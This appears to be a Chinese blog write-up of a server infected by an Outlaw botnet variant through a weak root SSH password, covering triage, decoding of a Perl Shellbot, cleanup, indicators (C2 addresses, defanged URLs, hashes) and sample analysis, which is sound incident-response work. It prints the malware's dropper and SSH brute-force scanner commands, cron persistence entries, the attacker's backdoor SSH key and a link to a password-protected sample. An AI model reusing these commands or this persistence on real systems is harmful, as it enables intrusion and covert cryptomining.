

>今早看到来自朋友的消息：“检测到未处理的木马文件，疑似被黑客入侵”
>因为昨天溯源的时候了解了一下TCP跳转之类的神奇东西，所以耽误了一些事情，想起来这篇文章的时候已经是半夜了，今天早上朋友的手机收到了来自某服务商的短信， 短信上附加了某服务商的修复建议，大体上与我的过程相同，于是早上又学习了大佬的文章，就只能现在开始写这篇文章了。



## 为什么被攻击

1、ROOT用户未设置拒绝SSH连接，并且密码为弱口令
2、未更换默认SSH连接端口



## 病毒种类

按照腾讯云报道，此次攻击为“亡命徒（Outlaw）僵尸网络”的变体病毒，该僵尸网络最早于2018年被发现，其主要特征为通过SSH爆破攻击目标系统，同时传播基于Perl的Shellbot和门罗币挖矿木马。

## 病毒排查

一切都是由某云服务商的告警而起....
朋友抓了大约一分钟的通信数据包，从中发现了几条存在异常通讯内容的数据包和IP

至于我怎么看出来异常的，曾经看过关于挖矿程序连接矿池服务器通信的数据包，内容格式均基本相似，下面是以前看到的数据包。

![image-20211123105233842](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-20211123105233842.png)

看到该数据包的时候，本能的去微步在线查看了一下关于该IP地址的情报

在确定为恶意软件的通讯数据包后，就问朋友要了这台机器的账户和密码，准备上手练习练习
于是我就知道了为什么会被攻击
原因:root密码1q2w3e...

登录到服务器后:
1.使用top查看CPU资源占用率最高的进程确定挖矿病毒进程号

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-221bad198b624ef9a0e14e4551036434.png)

看到kswapd0占用百分之99.3（占用率按照单核算，多核就是核心数*每个核心占用率）

2.查看占用进程的病毒路径

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-aada4a1d891f4fd781dbe639280b10a2.png)

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-d4b4e33f37cf44238360b928f46183ec.png)

看到了有个cron.d的文件，说明该木马病毒设置了定时计划
让我们来瞅瞅

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-32b6d67c91bd4499a801266f9bd92a77.png)

可以看到病毒的计划目录

```bash
/tmp/.X25-unix.rsync/
```

让我们康康/root/.configrc/a目录里都有什么文件
![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-f4fc0424c2154cb5868901004879fd1f.png)

这里看了一下run，但是因为并不是很重要，所以忘记截图了，kswapd0做了编译，也没截图，后面补上
在/root/.configrc/b目录下倒是发现了病毒真正的shell文件

![image-20211123110026199](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-20211123110026199.png)

查看了b目录下的run文件，发现是加密的，在文件末尾标注了解密方式

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-a11e5a8e98004145a6add8362ed0b482.png)

上图中的代码分为两部分，以第一张和第二张图为界
（一） 恶意代码（base64加密）
（二） 把攻击者的rsa公钥添加到指定目录

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-950618fa64f84ed4ac0edc8d443ebdb6.png)

解出来的结果是基于Perl的代码，所以
（一） 将代码开头eval改为print
（二） 创建文件ax.pl
（三） 把更改过的代码扔进去
（四） Perl ax.pl | less

![image-20211123110300214](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-20211123110300214.png)

第一条写的my $processo = 'rsync';表示程序的进程名，`该病毒的进程名与系统进程rsync类似，但是系统进程rsync的进程名为rsyncd`
第二条就是C2服务器的地址了

既然知道了木马病毒的进程名，那么，瞅瞅去

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-1877cd63bbfc411db08914c7397cff06.png)

确认了下，那个/usr/bin/perl没啥问题，只是申明为perl脚本

因为之前a目录中的run没有截图，所以后面补上一下

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-c7a1b6b9652949fba68b8126c051b4e2.png)

总的来说就是先结束正在运行的木马进程，然后去判断CPU架构，如果是x86_64的话就运行木马程序

再瞅瞅之前发现的目录/tmp/.X25-unix.rsync/

![image-20211123110457645](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-20211123110457645.png)

可以看出来也属于病毒的一部分了，基本是病毒的运行缓存文件，dota3.tar.gz就是病毒原文件，应该是脚本去自动下载的，如果我是病毒作者我就会去删除

其实在这些步骤之前，我每找到一个目录时都优先进行打包，我比较害怕会有什么自毁装置，或者破坏了病毒的完整性，后来是我想多了。

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-1d3aa3e26e4145dfb22001705c50b420.png)

下载到本地被报毒

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-ff593ed5a93646f8a21e99095493ab7f.png)

找到这以后基本病毒的全部文件都找齐了，接下来说说怎么清理

---
如何清理？
PS:每个主机被放置的路径都可能不一样，请自行按照之前的方法寻找

首先先把它进程宰了（可能进程名不同，按照实际情况来）

```bash
kill xxxx
```

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-16cb6c7933ab49a8b722500bb4238c31.png)

再清除相关定时任务
crontab -e
把里面属于病毒的那部分删除

删除相关后门ssh key内容

```
vi /root/.ssh/authorized_keys
```

将里面的病毒key删除，我后面会贴上来

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-52b440fd733c4e7092933d8dd338584b.png)

删除缓存文件

```
rm -rf /tmp/.X25-unix/dota3.tar.gz /tmp/.X25-unix/.rsync/*
```

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-fc24dc8d0d9341d6934ca85fc8f8b222.png)

删除病毒目录及文件（可能会在其他目录也会有零散文件）

```
rm -rf /root/.configrc
```

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-8a3a8005c2ad421e9cc647dd9d14713f.png)

最后检查一下是否存在多余用户，再更改用户密码
cat /etc/passwd
检查一下是否其他地方有病毒文件

```
find / -name kswapd0
```

---



## 病毒结构

病毒结构(经过网上查证，该病毒种类繁多，文件位置基本不一样)

```
/root/.configrc/*		病毒所在目录/root/.ssh/			病毒公钥/tmp/.X25-unix/.rsync/*		病毒运行缓存文件/tmp/.X25-unix/dota3.tar.gz	病毒压缩包/root/.configrc/a/kswapd0  	病毒主程序==========病毒相关计划任务==========1 1 */2 * * /root/.configrc/a/upd>/dev/null 2>&1@reboot /root/.configrc/a/upd>/dev/null 2>&15 8 * * 0 /root/.configrc/b/sync>/dev/null 2>&1@reboot /root/.configrc/b/sync>/dev/null 2>&10 0 */3 * * /tmp/.X25-unix/.rsync/c/aptitude>/dev/null 2>&1====================================
```



病毒安装文件：

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-2644efbe0acf493f96c30cc2f9d97280.png)

病毒安装后的文件（还有/tmp里的，不过我这是解压出来做的）

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-4f343db3d0bf4c6abccdf41e02116b4c.png)

病毒相关地址：

```
45.9.148.99
45.9.148.125
45.9.148.129
45.9.148.117
45.55.57.6
188.166.58.29
104.236.228.46
165.227.45.249
192.241.211.94
188.166.6.130
142.93.34.237
46.101.33.198
149.202.162.73
167.71.155.236
157.245.83.8
45.55.129.23
46.101.113.206
37.139.0.226
159.203.69.48
104.131.189.116
159.203.102.122
159.203.17.176
91.121.51.120
128.199.178.188
208.68.39.124
45.55.210.248
206.81.10.104
5.230.65.21
138.197.230.249
107.170.204.148
domain:www[.]debian-package[.]center
domain:debian-package[.]center
```

关键MD5如下:

| FILE         | MD5                              |
| ------------ | -------------------------------- |
| dota3.tar.gz | 1a4592f48f8d1bf77895862e877181e0 |
| kswapd0      | 84945e9ea1950be3e870b798bd7c7559 |
| tsm64        | 4adb78770e06f8b257f77f555bf28065 |
| tsm32        | 10ea65f54f719bffcc0ae2cde450cb7a |
| run          | 716e6b533f836cee5e480a413a84645a |

病毒调用的URL如下(FBI警告，请勿将链接作为非法用途）：

```
http[:]//45.55.57.6/dota3.tar.gz
http[:]//188.166.58.29/dota3.tar.gz
http[:]//104.236.228.46/dota3.tar.gz
http[:]//165.227.45.249/dota3.tar.gz
http[:]//192.241.211.94/dota3.tar.gz
http[:]//188.166.6.130/dota3.tar.gz
http[:]//142.93.34.237/dota3.tar.gz
http[:]//46.101.33.198/dota3.tar.gz
http[:]//149.202.162.73/dota3.tar.gz
http[:]//167.71.155.236/dota3.tar.gz
http[:]//157.245.83.8/dota3.tar.gz
http[:]//45.55.129.23/dota3.tar.gz
http[:]//46.101.113.206/dota3.tar.gz
http[:]//37.139.0.226/dota3.tar.gz
http[:]//159.203.69.48/dota3.tar.gz
http[:]//104.131.189.116/dota3.tar.gz
http[:]//159.203.102.122/dota3.tar.gz
http[:]//159.203.17.176/dota3.tar.gz
http[:]//91.121.51.120/dota3.tar.gz
http[:]//128.199.178.188/dota3.tar.gz
http[:]//208.68.39.124/dota3.tar.gz
http[:]//45.55.210.248/dota3.tar.gz
http[:]//206.81.10.104/dota3.tar.gz
http[:]//5.230.65.21/dota3.tar.gz
http[:]//138.197.230.249/dota3.tar.gz
http[:]//107.170.204.148/dota3.tar.gz
```
---

## 样本分析

> Outlaw通过SSH爆破攻击，访问目标系统并下载带有shell脚本、挖矿木马、后门木马的TAR压缩包文件dota3.tar.gz。解压后的文件目录可以看到，根目录rsync下存放初始化脚本，a目录下存放shellbot后门，b目录下存放挖矿木马，c目录下存放SSH爆破攻击程序。以下内容参考[腾讯云安全](https://s.tencent.com/research/report/1021.html)，本来是今天想做，但是发现已经有现成的了。

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-f4c1510e4f1e4f9299b2fbb11a8b8b91.png)

C目录下二进制文件tsm32、tsm64为SSH（22端口）扫描和爆破程序，并可以通过执行远程命名来下载和执行恶意程序。

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-35851251dd4a4eaf9df46dec01f1783c.png)

爆破成功后执行base64编码的shell命令，主要功能为删除旧版本的恶意程序和目录，然后解压获取到的最新版本恶意程序并执行，内容如下：

命令1：

```
#!/bin/bashcd /tmp rm -rf .sshrm -rf .mountfsrm -rf .X13-unixrm -rf .X17-unixrm -rf .X19-unixrm -rf .X2*mkdir .X25-unixcd .X25-unixmv ar/tmp/dota3.tar.gz dota3.tar.gztar xf dota3.tar.gzsleep 3s && cd .rsync; cat /tmp/.X25-unix/.rsync/initall | bash 2>1&sleep 45s && pkill -9 run && pkill -9 go && pkill -9 tsmexit 0
```

命令2：

```
#!/bin/bashcd /tmp rm -rf .sshrm -rf .mountfsrm -rf .X13-unixrm -rf .X17-unixrm -rf .X19-unixrm -rf .X2*mkdir .X25-unixcd .X25-unixmv ar/tmp/dota3.tar.gz dota3.tar.gztar xf dota3.tar.gzsleep 3s && cd /tmp/.X25-unix/.rsync/cnohup /tmp/.X25-unix/.rsync/cm -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0 /tmp/up.txt 192.168 >> /dev/null 2>1&sleep 8m && nohup /tmp/.X25-unix/.rsync/cm -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0 /tmp/up.txt 172.16 >> /dev/null 2>1&sleep 20m && cd ..; /tmp/.X25-unix/.rsync/initall 2>1&exit 0
```



还会通过远程命令修改SSH公钥为：

```
AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==
```

以便之后能更容易入侵。

B目录下run脚本主要内容为base64编码的shellbot后门程序，解码后可以看到代码仍然经过混淆。

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-b937b83850984de485a8456ae2be7d5d.png)

把执行函数eval改为print可打印出解密后的代码，是基于Perl的Shellbot变种，连接C2服务器地址为45.9.148.99:443，能够执行多个后门命令，包括文件下载、执行shell cmd和DDoS攻击。如果接受到扫描端口命令，可针对以下端口进行扫描："21","22","23","25","53","80","110","143","6665"。

A目录下二进制文件kswapd0为XMRig编译的Linux平台门罗币挖矿木马。

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-0a3332b8007f4489a3b187def66e432c.png)

在初始化阶段会执行脚本init0来找到大量Linux平台竞品挖矿木马并进行清除。

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-1155977ac6ae4285af479f0d869ae98c.png)

在当前用户目录下创建/.configrc目录，拷贝a、b文件夹到该目录下并执行初始化脚本，然后通过写入cron.d安装计划任务进行持久化。

![image.png](../assets/2020-07-05-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E6%BA%AF%E6%BA%90-%E5%AF%B9%E6%8A%97Outlaw%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%A7%8D%E4%B8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/image-627c3dafa7c0494a899cba1b3c0e4429.png)


---


## 样本

最后的最后，病毒样本我上传在附件了，请勿用作任何非法用途，仅能用于学习交流，解压密码:n0b1ta

~~../_files/Outlaw-dota3-3a17cc7a6987480d8d39cd84a25da036.7z~~
